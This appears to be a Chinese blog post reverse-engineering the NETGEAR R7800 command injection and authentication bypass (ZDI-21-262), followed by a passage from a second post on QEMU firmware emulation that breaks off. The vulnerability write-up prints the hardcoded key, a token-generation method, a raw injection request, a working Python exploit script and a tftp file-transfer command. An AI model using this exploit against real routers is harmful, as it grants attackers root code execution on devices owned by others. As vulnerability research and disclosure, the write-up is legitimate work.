<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-262/</span></span><br><span class="line">(Pwn2Own) NETGEAR R7800 apply_save.cgi rc_service Command Injection Remote Code Execution Vulnerability</span><br><span class="line"></span><br><span class="line">This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R7800. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of the rc_service parameter provided to apply_save.cgi. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code <span class="keyword">in</span> the context of root.</span><br></pre></td></tr></table></figure>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul>
<li>官网信息</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://kb.netgear.com/000062883/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Satellites-and-Extenders</span></span><br><span class="line">R7800, running firmware versions prior to 1.0.2.80</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.netgear.com/support/product/R7800.aspx#download</span></span><br><span class="line">最新10280</span><br><span class="line">较新10278</span><br><span class="line"></span><br><span class="line"><span class="comment"># 时间</span></span><br><span class="line">2020-12-31 - Vulnerability reported to vendor</span><br><span class="line">80：Last Updated:01/18/2021</span><br><span class="line">78：Last Updated:12/04/2020</span><br></pre></td></tr></table></figure>
<ul>
<li><p>版本选择；官网通告80前，cve上76，故76 vs 80万无一失（78 vs 80也行</p>
</li>
<li><p>串口</p>
</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win安装驱动</span></span><br><span class="line">ch340G土豪金、CH341SER.EXE</span><br><span class="line"><span class="comment"># xshell</span></span><br><span class="line">协议serial、端口号com3（com1为自带的）、波特率115200</span><br></pre></td></tr></table></figure>
<ul>
<li>打印日志辅助分析</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 输出日志的代码逻辑</span></span><br><span class="line"><span class="function">FILE *<span class="title">print_log</span><span class="params">(<span class="keyword">int</span> file, <span class="keyword">int</span> func, <span class="keyword">int</span> line, <span class="keyword">int</span> num, <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = fopen(<span class="string">"/tmp/funjsq_log_level"</span>, <span class="string">"r"</span>); <span class="comment">// 手动创建此文件 </span></span><br><span class="line">  fp_1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    fgets(s, <span class="number">64</span>, fp_1);</span><br><span class="line">    nptr = strtok(s, <span class="string">"\t\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( nptr )</span><br><span class="line">      log_level = atoi(nptr);                   <span class="comment">// 获取日志等级 </span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( num &lt;= log_level )                       <span class="comment">// 目前已看到最大的num=8，故 内容设为9</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !access(<span class="string">"/tmp/funjsqd1000"</span>, <span class="number">0</span>) )       <span class="comment">// 不能存在此文件</span></span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    result = access(<span class="string">"/tmp/funjsqd2000"</span>, <span class="number">0</span>);     <span class="comment">// 手动创建此文件</span></span><br><span class="line">                                                <span class="comment">// access，文件存在返回0</span></span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(log_file, <span class="string">"/tmp/funjsq_log"</span>);      <span class="comment">// 手动创建此文件 </span></span><br><span class="line">      v26 = fopen(log_file, <span class="string">"at+"</span>);             <span class="comment">// 写日志必用到fopen</span></span><br><span class="line">      <span class="keyword">if</span> ( v26 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(v26, <span class="string">" %s/%s/%d  "</span>, file, func, line);<span class="comment">// 写入日志文件 </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 手动配置</span></span><br><span class="line">root@R7800:~<span class="meta"># ls funjsq*</span></span><br><span class="line">funjsq_httpd.pid    funjsq_log_level    funjsqd2000</span><br><span class="line">funjsq_log          funjsq_resolv.conf</span><br><span class="line">root@R7800:~<span class="meta"># cat funjsq_log_level</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line">root@R7800:~<span class="meta"># tail -f funjsq_log</span></span><br></pre></td></tr></table></figure>
<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><ul>
<li>过程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.zerodayinitiative.com/advisories/ZDI-21-262/</span></span><br><span class="line">(Pwn2Own) NETGEAR R7800 apply_save.cgi rc_service Command Injection Remote Code Execution Vulnerability</span><br><span class="line"></span><br><span class="line">This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R7800. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of the rc_service parameter provided to apply_save.cgi. The issue results from the lack of proper validation of a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code <span class="keyword">in</span> the context of root.</span><br><span class="line"><span class="comment"># 通告中：apply_save.cgi、rc_service、system</span></span><br><span class="line"><span class="comment"># 字符串rc_service</span></span><br><span class="line">找到my_vulnee_apply_cgi函数，交叉引用找到结构体数组</span><br><span class="line"><span class="comment"># 字符串apply_save.cgi</span></span><br><span class="line">alt+b找到结构体数组</span><br><span class="line"><span class="comment"># 函数system</span></span><br><span class="line">并非直接调用，而是通过call_system函数来间接调用的</span><br><span class="line"><span class="comment"># bindiff</span></span><br><span class="line">并未发现修改，修复了认证绕过，这个自然就修了（前者是后者的前提，故如此修复</span><br></pre></td></tr></table></figure>
<ul>
<li>漏洞点</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参数action_mode、rc_service</span></span><br><span class="line">int __fastcall my_vulnee_apply_cgi(FILE *a1, int a2, int a3, int a4, const char *a5)</span><br><span class="line">&#123;</span><br><span class="line">  action_mode = my_getvalue(<span class="string">"action_mode"</span>); <span class="comment"># 需指定为apply</span></span><br><span class="line">  <span class="keyword">if</span> ( !action_mode )</span><br><span class="line">    action_mode = byte_31634;</span><br><span class="line">  s1 = action_mode;</span><br><span class="line">  <span class="keyword">if</span> ( !strcmp(s1, <span class="string">"apply"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    rc_service = my_getvalue(<span class="string">"rc_service"</span>);<span class="comment"># 待注入参数</span></span><br><span class="line">    <span class="keyword">if</span> ( !rc_service )</span><br><span class="line">      rc_service = byte_31634;</span><br><span class="line">    cmd = rc_service;</span><br><span class="line">    <span class="keyword">if</span> ( rc_service &amp;&amp; *cmd )</span><br><span class="line">      call_system(cmd);                         <span class="comment"># inject</span></span><br><span class="line">      </span><br><span class="line"><span class="comment"># 间接调用system</span></span><br><span class="line">int __fastcall call_system(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  system(a1);</span><br><span class="line">  <span class="built_in">return</span> 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h2><ul>
<li>过程</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通告中：hard-coded encryption key.</span></span><br><span class="line">找到可疑字符串</span><br><span class="line">.rodata:00031B08 key             DCB <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>,0</span><br><span class="line"><span class="comment"># 结合bindiff</span></span><br><span class="line">0.7076943740519013	0.976390702552711	00017660	sub_00017660	Normal	00017BC4	sub_00017BC4	Normal</span><br></pre></td></tr></table></figure>
<ul>
<li>漏洞点</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 旧，v76，硬编码的key</span></span><br><span class="line">bool __fastcall my_vulnee2_check_token(const char *old_token)</span><br><span class="line">&#123;</span><br><span class="line">  char key[128]; // [sp+1Ch] [bp-90h] BYREF</span><br><span class="line">  char *new_token; // [sp+9Ch] [bp-10h]</span><br><span class="line">  const char *v6; // [sp+A0h] [bp-Ch]</span><br><span class="line">  char *router_MAC; // [sp+A4h] [bp-8h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !old_token || strlen(old_token) != 32 )</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">  router_MAC = get_router_MAC();</span><br><span class="line">  <span class="keyword">if</span> ( !router_MAC )</span><br><span class="line">    router_MAC = get_router_MAC();</span><br><span class="line">  <span class="keyword">if</span> ( !router_MAC )</span><br><span class="line">    <span class="built_in">return</span> 1;</span><br><span class="line">  v6 = <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>;</span><br><span class="line">  memset(key, 0, sizeof(key));</span><br><span class="line">  sprintf(key, <span class="string">"%s|%s"</span>, router_MAC, <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_token"</span>, 495, 3, <span class="string">"str=%s"</span>, key);</span><br><span class="line">  new_token = make_token(key);</span><br><span class="line">  <span class="keyword">if</span> ( !new_token || strlen(new_token) &lt;= 31 )</span><br><span class="line">    <span class="built_in">return</span> 1;</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_token"</span>, 502, 3, <span class="string">"nt=%s, ot=%s"</span>, new_token, old_token);</span><br><span class="line">  <span class="built_in">return</span> strncasecmp(new_token, old_token, 32u) == 0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 新，v80，远程身份认证</span></span><br><span class="line">bool __fastcall check_t(const char *token)</span><br><span class="line">&#123;</span><br><span class="line">  char cmd[256]; // [sp+14h] [bp-118h] BYREF</span><br><span class="line">  char *nptr; // [sp+114h] [bp-18h]</span><br><span class="line">  char *router_MAC; // [sp+118h] [bp-14h]</span><br><span class="line">  int v7; // [sp+11Ch] [bp-10h]</span><br><span class="line">  char *ip; // [sp+120h] [bp-Ch]</span><br><span class="line">  const char *host; // [sp+124h] [bp-8h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !token || strlen(token) != 32 )</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">  memset(cmd, 0, sizeof(cmd));</span><br><span class="line">  host = <span class="string">"wxapi.funjsq.com"</span>;</span><br><span class="line">  ip = 0;</span><br><span class="line">  v7 = 0;</span><br><span class="line">  sprintf(cmd, <span class="string">"%s/funjsq_nslookup %s"</span>, <span class="string">"/data/funjsq/bin"</span>, <span class="string">"wxapi.funjsq.com"</span>);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_t"</span>, 483, 5, <span class="string">"----主进程-----------cmd=%s--------------\n"</span>);</span><br><span class="line">  ip = get_config_value(cmd);</span><br><span class="line">  router_MAC = get_router_MAC();</span><br><span class="line">  <span class="keyword">if</span> ( strchr(ip, <span class="string">'.'</span>) )</span><br><span class="line">    sprintf(</span><br><span class="line">      cmd,</span><br><span class="line">      <span class="string">"curl -s -H 'Host:%s' -d 'm=%s'  -d 't=%s' https://%s/wxMini/v2/cm/ck -k  -m 10 "</span>,</span><br><span class="line">      host,</span><br><span class="line">      router_MAC,</span><br><span class="line">      token,</span><br><span class="line">      ip);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    sprintf(cmd, <span class="string">"curl -s -d 'm=%s'  -d 't=%s'   https://%s/wxMini/v2/cm/ck -k -m 10 "</span>, router_MAC, token, host);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_t"</span>, 494, 4, <span class="string">"cmd=%s"</span>);</span><br><span class="line">  nptr = get_config_value(cmd);</span><br><span class="line">  print_log(<span class="string">"apply.c"</span>, <span class="string">"check_t"</span>, 498, 4, <span class="string">"ret=%s"</span>);</span><br><span class="line">  <span class="built_in">return</span> atoi(nptr) == 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要AccessToken</span></span><br><span class="line">GET /apply_save.cgi?action_mode=apply&amp;rc_service=sleep<span class="variable">$&#123;IFS&#125;</span>333 HTTP/1.1</span><br><span class="line">Host: 192.168.1.1:12300</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: 5</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">AccessToken: 095A29B5D928CE40B9190BA7438472CD </span><br><span class="line">Content-Length: 0</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成AccessToken：md5、mac地址、硬编码的key</span></span><br><span class="line">md5(<span class="string">"8C:3B:AD:B7:EF:35|3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span>) = 095A29B5D928CE40B9190BA7438472CD</span><br></pre></td></tr></table></figure>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>获取mac：<a href="https://www.jb51.net/article/49661.htm" target="_blank" rel="noopener">https://www.jb51.net/article/49661.htm</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> srp,Ether,ARP</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># ignore InsecureRequestWarning</span></span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(target_ip)</span>:</span></span><br><span class="line">    ipscan = <span class="string">"%s/24"</span>%target_ip</span><br><span class="line">    ans,unans = srp(Ether(dst=<span class="string">"FF:FF:FF:FF:FF:FF"</span>)/ARP(pdst=ipscan),timeout=<span class="number">2</span>,verbose=<span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">for</span> snd,rcv <span class="keyword">in</span> ans:</span><br><span class="line">        mac = rcv.sprintf(<span class="string">"%Ether.src%"</span>)</span><br><span class="line">        ip = rcv.sprintf(<span class="string">"%ARP.psrc%"</span>)</span><br><span class="line">        <span class="comment"># print(mac,ip)</span></span><br><span class="line">        <span class="keyword">if</span> ip == target_ip:</span><br><span class="line">            <span class="keyword">return</span> mac.upper()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(token)</span>:</span></span><br><span class="line">    url = <span class="string">"https://%s:12300/apply_save.cgi?action_mode=apply&amp;rc_service=%s"</span> %(target_ip,cmd)</span><br><span class="line">    token = make_token(mac)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"AccessToken"</span>: token,</span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.get(url,headers = headers,verify=<span class="keyword">False</span>)</span><br><span class="line">    print(res.status_code)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_token</span><span class="params">(mac)</span>:</span></span><br><span class="line">    raw = <span class="string">'%s|%s'</span> %(mac.upper(),key)</span><br><span class="line">    token = hashlib.md5(raw.encode(encoding=<span class="string">'UTF-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> token.upper()</span><br><span class="line"></span><br><span class="line">key = <span class="string">"3apatqHBKnhJxFP4fJ2oC3IXNnazo03g"</span></span><br><span class="line">target_ip = <span class="string">"192.168.1.1"</span></span><br><span class="line">cmd = <span class="string">"sleep$&#123;IFS&#125;222"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    mac = get_mac(target_ip)<span class="comment">#8C:3B:AD:B7:EF:35</span></span><br><span class="line">    <span class="comment">#mac = "8C:3B:AD:B7:EF:35"</span></span><br><span class="line">    <span class="comment">#print(mac)</span></span><br><span class="line">    token = make_token(mac)<span class="comment">#095A29B5D928CE40B9190BA7438472CD</span></span><br><span class="line">    <span class="comment">#print(token)</span></span><br><span class="line">    exp(token)</span><br></pre></td></tr></table></figure>
<h2 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h2><ul>
<li>需微信绑定“游戏加速器”</li>
<li>设备重置后，token依然留在设备中</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不存在nvram中</span></span><br><span class="line">nvmra show |grep 095A29B5D928CE40B9190BA7438472CD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存在redis数据库中</span></span><br><span class="line">root@R7800:/data/funjsq/config/redis<span class="comment"># ps|grep redis</span></span><br><span class="line">17684 root        420 S   /data/funjsq/bin/funjsq_redis -d /data/funjsq/config/</span><br><span class="line">20009 root        368 S   grep redis</span><br><span class="line"><span class="comment"># 完整命令</span></span><br><span class="line">root@R7800:/data/funjsq/config/redis<span class="comment"># cat /proc/17684/cmdline</span></span><br><span class="line">/data/funjsq/bin/funjsq_redis<span class="_">-d</span>/data/funjsq/config/redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据存放位置</span></span><br><span class="line">/data/funjsq/config/redis目录下的0.udbData中</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证是否需要绑定</span></span><br><span class="line">清空0.udbData文件（事先备份），杀掉redis并重新启动（因为数据已读取到内存中），再次测试exp，发现失败，说明需要绑定</span><br></pre></td></tr></table></figure>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul>
<li>认证绕过和命令注入组合漏洞，只修复了前者，后者也就不能执行了</li>
<li>猜测：前者是后者的前提，故如此修复</li>
</ul>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><ul>
<li>严格来讲，并非命令注入（sprintf拼接字符串后再system才是），接收参数后直接调system，没有注入到命令字符串，算是系统的自带功能，概念问题，不必过分纠结</li>
<li>token为32个字节，共256比特，大胆猜测md5，以免扣代码</li>
<li>最新v80，v78也受影响</li>
<li>实时查看日志：tail + grep</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 绑定的瞬间会有token</span></span><br><span class="line">root@R7800:~<span class="comment"># tail -f funjsq_log|grep token</span></span><br><span class="line">[2021-03-25 10:56:13]  [INFO]  httpd.c/auth_check/402  [httpd] token tail:095A29B5D928CE40B9190BA7438472CD, none</span><br><span class="line">[2021-03-25 10:56:13]  [INFO]  httpd.c/handle_request/1015  old auth_token=095A29B5D928CE40B9190BA7438472CD</span><br><span class="line"> 2021-03-25 10:56:13]  [INFO]  httpd.c/handle_request/1016  header access_token=none</span><br><span class="line">[2021-03-25 10:56:30]  [DEBUG]  httpd.c/auth_check/399  [httpd] token success:095A29B5D928CE40B9190BA7438472CD, 095A29B5D928CE40B9190BA7438472CD</span><br><span class="line">Terminated</span><br></pre></td></tr></table></figure>
<ul>
<li>测试前先搞清楚端口号</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">21226 root       1232 S   /data/funjsq/bin/funjsq_httpd -p 12300 -s root</span><br><span class="line">root@R7800:~<span class="comment"># cat /proc/21226/cmdline</span></span><br><span class="line">/data/funjsq/bin/funjsq_httpd-p12300-sroot</span><br></pre></td></tr></table></figure>
<ul>
<li><p>组合漏洞：cve号一般是连着的或接近的，zdi号不一定，根据情况向前或向后找（注入27256、认证绕过27254、之前误以为是27255，应组合54和56</p>
</li>
<li><p>tftp向外传输文件：./busybox-armv4tl tftp -p -l funjsq_log_level 192.168.1.3（put上传、local本地文件</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/03/30/iot/iot设备固件模拟-总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/30/iot/iot设备固件模拟-总结/" class="post-title-link" itemprop="url">iot设备固件模拟-总结</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-03-30 14:41:33" itemprop="dateCreated datePublished" datetime="2021-03-30T14:41:33+08:00">2021-03-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 16:07:00" itemprop="dateModified" datetime="2022-02-21T16:07:00+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="iot设备固件模拟-总结"><a href="#iot设备固件模拟-总结" class="headerlink" title="iot设备固件模拟-总结"></a>iot设备固件模拟-总结</h1><h1 id="01-qemu-system"><a href="#01-qemu-system" class="headerlink" title="01-qemu-system"></a>01-qemu-system</h1><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><ul>
<li>所需文件</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内核、硬盘、</span></span><br><span class="line">/arm_qemu  ls</span><br><span class="line">debian_wheezy_armhf_standard.qcow2 </span><br><span class="line">initrd.img-3.2.0-4-vexpress        </span><br><span class="line">run.sh                             </span><br><span class="line">vmlinuz-3.2.0-4-vexpress</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动脚本</span></span><br><span class="line">/arm_qemu  cat run.sh</span><br><span class="line">qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive <span class="keyword">if</span>=sd,file=debian_wheezy_armhf_standard.qcow2 -append <span class="string">"root=/dev/mmcblk0p2 console=ttyAMA0"</span> -net nic -net 